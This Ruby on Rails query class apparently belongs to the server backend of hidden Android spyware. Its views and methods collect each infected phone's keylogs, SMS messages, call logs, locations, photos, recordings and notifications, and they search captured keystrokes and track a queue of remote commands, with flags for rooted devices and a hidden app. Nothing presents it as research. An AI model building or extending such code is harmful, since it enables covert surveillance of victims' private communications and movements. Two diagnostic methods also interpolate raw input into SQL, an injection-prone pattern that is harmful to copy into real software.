class OptimizedQueries
  class << self
    # ─── Dashboard Queries ──────────────────────────────────────────────

    # Single-query device dashboard: returns all stats per device in one round-trip
    def device_dashboard(smartphone_id = nil)
      scope = Smartphone.with_stats.includes(:apk_installation)
      scope = scope.where(id: smartphone_id) if smartphone_id
      scope
    end

    # Device summary view - aggregates key metrics per device
    def device_summary_view_sql
      <<-SQL
        CREATE OR REPLACE VIEW device_summaries AS
        SELECT 
          s.id,
          s.device_id,
          s.name AS device_name,
          s.operating_system,
          s.is_rooted,
          s.is_app_hidden,
          ai.status,
          ai.target_ip,
          COUNT(DISTINCT k.id) AS keylogs_count,
          (SELECT COUNT(*) FROM pending_commands pc WHERE pc.smartphone_id = s.id) AS commands_count,
          COUNT(DISTINCT l.id) as location_count,
          COUNT(DISTINCT sm.id) as sms_count,
          COUNT(DISTINCT cl.id) as call_count,
          COUNT(DISTINCT p.id) as picture_count,
          COUNT(DISTINCT r.id) as recording_count,
          COUNT(DISTINCT dn.id) as notification_count,
          MAX(k.created_at) as last_keylog_at,
          MAX(l.created_at) as last_location_at,
          MAX(sm.created_at) as last_sms_at,
          MAX(cl.created_at) as last_call_at,
          MAX(dn.received_at) as last_notification_at,
          GREATEST(
            MAX(k.created_at),
            MAX(l.created_at),
            MAX(sm.created_at),
            MAX(cl.created_at),
            MAX(dn.received_at)
          ) as last_activity_at
        FROM smartphones s
        LEFT JOIN apk_installations ai ON ai.id = s.apk_installation_id
        LEFT JOIN keylogs k ON k.smartphone_id = s.id AND k.created_at > NOW() - INTERVAL '30 days'
        LEFT JOIN geo_locations l ON l.smartphone_id = s.id AND l.created_at > NOW() - INTERVAL '30 days'
        LEFT JOIN sms_messages sm ON sm.smartphone_id = s.id AND sm.created_at > NOW() - INTERVAL '30 days'
        LEFT JOIN call_logs cl ON cl.smartphone_id = s.id AND cl.created_at > NOW() - INTERVAL '30 days'
        LEFT JOIN pictures p ON p.smartphone_id = s.id AND p.created_at > NOW() - INTERVAL '30 days'
        LEFT JOIN recordings r ON r.smartphone_id = s.id AND r.created_at > NOW() - INTERVAL '30 days'
        LEFT JOIN device_notifications dn ON dn.device_id = s.device_id AND dn.received_at > NOW() - INTERVAL '30 days'
        GROUP BY s.id, s.device_id, s.name, s.operating_system, s.is_rooted, s.is_app_hidden, ai.status, ai.target_ip;
      SQL
    end

    # ─── Location History ───────────────────────────────────────────────

    # Paginated location history using cursor-based pagination
    def location_history(smartphone_id, after: nil, limit: 50)
      scope = GeoLocation
        .where(smartphone_id: smartphone_id)
        .order(created_at: :desc)
        .select(:id, :lat, :long, :date, :created_at)

      scope = scope.where('id < ?', after) if after.present?
      records = scope.limit(limit + 1).to_a
      has_more = records.size > limit
      records = records.first(limit)

      { records: records, has_more: has_more, cursor: records.last&.id }
    end

    # ─── Keylog Search ──────────────────────────────────────────────────

    # Full-text search across keylogs (uses trigram index if available)
    def keylog_search(smartphone_id, query, page: 1, per_page: 50)
      sanitized = ActiveRecord::Base.sanitize_sql_like(query)
      Keylog
        .where(smartphone_id: smartphone_id)
        .where('keystroke ILIKE :q OR full_text ILIKE :q OR app_name ILIKE :q', q: "%#{sanitized}%")
        .order(created_at: :desc)
        .limit(per_page)
        .offset((page - 1) * per_page)
        .select(:id, :app_name, :app_package, :keystroke, :full_text, :event_type, :created_at)
    end

    # ─── Command History ────────────────────────────────────────────────

    # Command history with response status breakdown
    def command_history(smartphone_id, status: nil, page: 1, per_page: 50)
      scope = PendingCommand
        .where(smartphone_id: smartphone_id)
        .order(created_at: :desc)
        .select(:id, :request_id, :command, :status, :created_at, :completed_at)

      scope = scope.where(status: PendingCommand.statuses[status]) if status.present?
      scope.limit(per_page).offset((page - 1) * per_page)
    end

    # ─── Existing views ────────────────────────────────────────────────
    
    # Keylog activity summary by app
    def keylog_app_stats_view_sql
      <<-SQL
        CREATE OR REPLACE VIEW keylog_app_stats AS
        SELECT 
          k.smartphone_id,
          k.app_package,
          k.app_name,
          COUNT(*) as keystroke_count,
          COUNT(DISTINCT DATE(k.created_at)) as active_days,
          MIN(k.created_at) as first_seen,
          MAX(k.created_at) as last_seen,
          COUNT(DISTINCT k.session_id) as session_count
        FROM keylogs k
        WHERE k.created_at > NOW() - INTERVAL '30 days'
        GROUP BY k.smartphone_id, k.app_package, k.app_name;
      SQL
    end
    
    # Command queue health view
    def command_queue_health_view_sql
      <<-SQL
        CREATE OR REPLACE VIEW command_queue_health AS
        SELECT 
          smartphone_id,
          COUNT(*) FILTER (WHERE status = 0) as pending_count,
          COUNT(*) FILTER (WHERE status = 1) as processing_count,
          COUNT(*) FILTER (WHERE status = 2) as completed_count,
          COUNT(*) FILTER (WHERE status = 3) as failed_count,
          COUNT(*) FILTER (WHERE status = 4) as timeout_count,
          AVG(EXTRACT(EPOCH FROM (completed_at - created_at))) FILTER (WHERE status = 2) as avg_completion_seconds,
          MAX(created_at) as last_command_at,
          COUNT(*) FILTER (WHERE created_at > NOW() - INTERVAL '1 hour') as commands_last_hour
        FROM pending_commands
        WHERE created_at > NOW() - INTERVAL '24 hours'
        GROUP BY smartphone_id;
      SQL
    end
    
    # Batch load devices with latest data (avoids N+1 queries)
    def devices_with_latest_data(time_range: 24.hours.ago)
      Smartphone
        .with_preloaded
        .includes(
          :keylogs,
          :geo_locations,
          :sms_messages,
          :call_logs
        )
        .where("keylogs.created_at > ? OR geo_locations.created_at > ?", time_range, time_range)
        .references(:keylogs, :geo_locations)
    end
    
    # Efficient device activity check using EXISTS
    def devices_active_in_range(start_time, end_time = Time.current)
      Smartphone.active_since(start_time)
    end
    
    # Get recent keylogs with efficient pagination (cursor-based)
    def recent_keylogs_paginated(smartphone_id, page: 1, per_page: 100)
      Keylog
        .where(smartphone_id: smartphone_id)
        .order(created_at: :desc)
        .limit(per_page)
        .offset((page - 1) * per_page)
        .select(:id, :app_name, :app_package, :keystroke, :event_type, :created_at, :client_timestamp)
    end

    # Cursor-based keylog pagination for large tables
    def recent_keylogs_cursor(smartphone_id, after: nil, limit: 100)
      Keylog
        .where(smartphone_id: smartphone_id)
        .cursor_paginate(after: after, limit: limit, order: :desc)
    end
    
    # ─── Diagnostics ────────────────────────────────────────────────────

    # Analyze query performance using EXPLAIN ANALYZE
    def analyze_query(sql)
      result = ActiveRecord::Base.connection.execute("EXPLAIN ANALYZE #{sql}")
      result.to_a
    end
    
    # Get slow queries from pg_stat_statements (requires extension)
    def slow_queries(min_duration_ms: 1000, limit: 20)
      ActiveRecord::Base.connection.execute(<<-SQL)
        SELECT 
          query,
          calls,
          total_exec_time,
          mean_exec_time,
          max_exec_time,
          rows
        FROM pg_stat_statements
        WHERE mean_exec_time > #{min_duration_ms}
        ORDER BY mean_exec_time DESC
        LIMIT #{limit};
      SQL
    rescue ActiveRecord::StatementInvalid => e
      if e.message.include?('does not exist')
        Rails.logger.warn "pg_stat_statements extension not installed"
        []
      else
        raise
      end
    end
    
    # Get table sizes and bloat information
    def table_statistics
      ActiveRecord::Base.connection.execute(<<-SQL)
        SELECT 
          schemaname,
          tablename,
          pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) AS total_size,
          pg_size_pretty(pg_relation_size(schemaname||'.'||tablename)) AS table_size,
          pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename) - pg_relation_size(schemaname||'.'||tablename)) AS index_size,
          pg_total_relation_size(schemaname||'.'||tablename) AS size_bytes
        FROM pg_tables
        WHERE schemaname = 'public'
        ORDER BY size_bytes DESC;
      SQL
    end
    
    # Get index usage statistics
    def index_usage_stats
      ActiveRecord::Base.connection.execute(<<-SQL)
        SELECT 
          schemaname,
          tablename,
          indexname,
          idx_scan as scans,
          idx_tup_read as tuples_read,
          idx_tup_fetch as tuples_fetched,
          pg_size_pretty(pg_relation_size(indexrelid)) as index_size,
          CASE 
            WHEN idx_scan = 0 THEN 'UNUSED'
            WHEN idx_scan < 50 THEN 'LOW'
            ELSE 'ACTIVE'
          END as usage_level
        FROM pg_stat_user_indexes
        ORDER BY idx_scan, schemaname, tablename;
      SQL
    end
    
    # Get missing index suggestions (based on seq scans)
    def missing_index_suggestions
      ActiveRecord::Base.connection.execute(<<-SQL)
        SELECT 
          schemaname,
          tablename,
          seq_scan as sequential_scans,
          seq_tup_read as rows_read,
          idx_scan as index_scans,
          CASE 
            WHEN seq_scan > 10000 AND idx_scan < seq_scan / 10 
            THEN 'HIGH PRIORITY - Consider adding index'
            WHEN seq_scan > 1000 AND idx_scan < seq_scan / 5 
            THEN 'MEDIUM PRIORITY - Review queries'
            ELSE 'Low priority'
          END as recommendation
        FROM pg_stat_user_tables
        WHERE seq_scan > 100
        ORDER BY seq_scan DESC;
      SQL
    end
    
    # Database connection pool statistics
    def connection_pool_stats
      pool = ActiveRecord::Base.connection_pool
      {
        size: pool.size,
        connections: pool.connections.size,
        busy_connections: pool.connections.count { |c| c.in_use? },
        dead_connections: pool.connections.count { |c| !c.active? },
        idle_connections: pool.connections.count { |c| !c.in_use? && c.active? },
        waiting_threads: pool.instance_variable_get(:@available)&.num_waiting || 0
      }
    end
    
    # Cache statistics from Redis
    def cache_stats
      return {} unless Rails.cache.respond_to?(:redis)
      
      info = Rails.cache.redis.info
      {
        connected_clients: info['connected_clients'],
        used_memory_human: info['used_memory_human'],
        used_memory_peak_human: info['used_memory_peak_human'],
        keyspace_hits: info['keyspace_hits'],
        keyspace_misses: info['keyspace_misses'],
        hit_rate: calculate_hit_rate(info['keyspace_hits'], info['keyspace_misses'])
      }
    rescue => e
      Rails.logger.error "Failed to get cache stats: #{e.message}"
      {}
    end
    
    private
    
    def calculate_hit_rate(hits, misses)
      total = hits.to_i + misses.to_i
      return 0 if total.zero?
      ((hits.to_f / total) * 100).round(2)
    end
  end
end
